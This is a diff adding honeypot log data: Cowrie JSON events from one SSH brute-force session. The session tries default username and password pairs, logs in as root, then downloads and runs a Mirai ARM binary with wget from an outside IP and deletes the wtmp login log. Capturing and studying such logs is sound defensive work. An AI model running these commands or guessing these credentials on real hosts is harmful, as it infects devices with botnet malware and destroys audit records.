@@ -1,0 +1,21 @@
+{"timestamp": "2026-09-21T19:12:00Z", "eventid": "cowrie.session.connect", "src_ip": "80.94.92.60", "sensor": "honeypot"}
+{"timestamp": "2026-09-21T19:12:01.497661Z", "eventid": "cowrie.login.failed", "src_ip": "80.94.92.60", "sensor": "honeypot", "username": "root", "password": "123456"}
+{"timestamp": "2026-09-21T19:12:02.240977Z", "eventid": "cowrie.login.failed", "src_ip": "80.94.92.60", "sensor": "honeypot", "username": "root", "password": "admin"}
+{"timestamp": "2026-09-21T19:12:03.453376Z", "eventid": "cowrie.login.failed", "src_ip": "80.94.92.60", "sensor": "honeypot", "username": "root", "password": "root"}
+{"timestamp": "2026-09-21T19:12:04.071265Z", "eventid": "cowrie.login.failed", "src_ip": "80.94.92.60", "sensor": "honeypot", "username": "admin", "password": "admin"}
+{"timestamp": "2026-09-21T19:12:04.888967Z", "eventid": "cowrie.login.failed", "src_ip": "80.94.92.60", "sensor": "honeypot", "username": "ubuntu", "password": "ubuntu"}
+{"timestamp": "2026-09-21T19:12:06.227412Z", "eventid": "cowrie.login.failed", "src_ip": "80.94.92.60", "sensor": "honeypot", "username": "pi", "password": "raspberry"}
+{"timestamp": "2026-09-21T19:12:07.431797Z", "eventid": "cowrie.login.failed", "src_ip": "80.94.92.60", "sensor": "honeypot", "username": "root", "password": "toor"}
+{"timestamp": "2026-09-21T19:12:08.736151Z", "eventid": "cowrie.login.failed", "src_ip": "80.94.92.60", "sensor": "honeypot", "username": "root", "password": "P@ssw0rd"}
+{"timestamp": "2026-09-21T19:12:10.141300Z", "eventid": "cowrie.login.failed", "src_ip": "80.94.92.60", "sensor": "honeypot", "username": "test", "password": "test"}
+{"timestamp": "2026-09-21T19:12:10.928940Z", "eventid": "cowrie.login.failed", "src_ip": "80.94.92.60", "sensor": "honeypot", "username": "oracle", "password": "oracle"}
+{"timestamp": "2026-09-21T19:12:12.033380Z", "eventid": "cowrie.login.failed", "src_ip": "80.94.92.60", "sensor": "honeypot", "username": "root", "password": "1234"}
+{"timestamp": "2026-09-21T19:12:12.830386Z", "eventid": "cowrie.login.failed", "src_ip": "80.94.92.60", "sensor": "honeypot", "username": "admin", "password": "1234"}
+{"timestamp": "2026-09-21T19:12:13.830386Z", "eventid": "cowrie.login.success", "src_ip": "80.94.92.60", "sensor": "honeypot", "username": "root", "password": "12345"}
+{"timestamp": "2026-09-21T19:12:17.995601Z", "eventid": "cowrie.command.input", "src_ip": "80.94.92.60", "sensor": "honeypot", "input": "uname -a"}
+{"timestamp": "2026-09-21T19:12:19.663575Z", "eventid": "cowrie.command.input", "src_ip": "80.94.92.60", "sensor": "honeypot", "input": "cat /proc/cpuinfo"}
+{"timestamp": "2026-09-21T19:12:24.573317Z", "eventid": "cowrie.command.input", "src_ip": "80.94.92.60", "sensor": "honeypot", "input": "wget http://185.220.101.9/bins/mirai.arm7 -O /tmp/x"}
+{"timestamp": "2026-09-21T19:12:28.718163Z", "eventid": "cowrie.command.input", "src_ip": "80.94.92.60", "sensor": "honeypot", "input": "chmod +x /tmp/x"}
+{"timestamp": "2026-09-21T19:12:30.320963Z", "eventid": "cowrie.command.input", "src_ip": "80.94.92.60", "sensor": "honeypot", "input": "/tmp/x"}
+{"timestamp": "2026-09-21T19:12:32.549645Z", "eventid": "cowrie.command.input", "src_ip": "80.94.92.60", "sensor": "honeypot", "input": "rm -rf /var/log/wtmp"}
+{"timestamp": "2026-09-21T19:12:35.652543Z", "eventid": "cowrie.command.input", "src_ip": "80.94.92.60", "sensor": "honeypot", "input": "crontab -l"}
